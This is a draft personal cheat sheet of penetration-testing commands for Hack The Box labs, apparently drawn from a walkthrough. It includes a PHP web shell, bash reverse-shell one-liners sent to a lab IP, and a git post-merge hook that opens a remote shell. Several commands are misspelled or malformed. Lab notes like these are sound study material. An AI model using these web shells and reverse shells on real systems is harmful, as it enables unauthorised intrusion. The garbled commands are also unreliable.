---
title: "Hack The Box: Cheat Sheet"
date: DATE
draft: true
tags: ["pentesting","htb"]
reads: 2
---
# Hack THE BOX Cheat sheet

# nmap

nmap -p- ip -oA allports

# burp

ctrl u to url encode

# netcat

nc -lvnp 9001

# strings
-l
-s
-b
# linux
#
tools search for strings

right click references to addres

## python proper shelll

python -c 'import pty:pty.spwn("/bin/bash")'

stty raw -echo

fg

stty rows 34 cols 136

## priv check

sudo -l

# php

## return result

<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "select * from profiles");
$reults = pg_fetch_assoc($result);
print_r($results);
?>

## php reverse shell

<?php
echo "test";
system($_REQUEST['hello']);
?>

system.php?hello='bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'

# website

check robots.txt

search for config files

try to wget file than run exiftool to see how recent service running is

## Gobuster

gobuser dir -u http://10.10.114 -w /usr/share/worldists/dirbuster/miediom -o gobuster.out

remove 302

gobuser dir -u http://10.10.114 -w /usr/share/worldists/dirbuster/miediom -o gobuster.out -s 200,204,302,307

enumerate after login in using cookie

-c cookie to enumerate after login
## javascript

copy javscript into web console 

# Windows

## debug exe

x32dbg
 run to user code

find strings

find reference to address


# git hooks get code access

cd hooks

touch post-merge

chmod +x post-merge

#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.13/9001 0>&1'

# copy files we do have write access

cp -r templated /dev/shm/

# Sources

Ippsec : Bitlab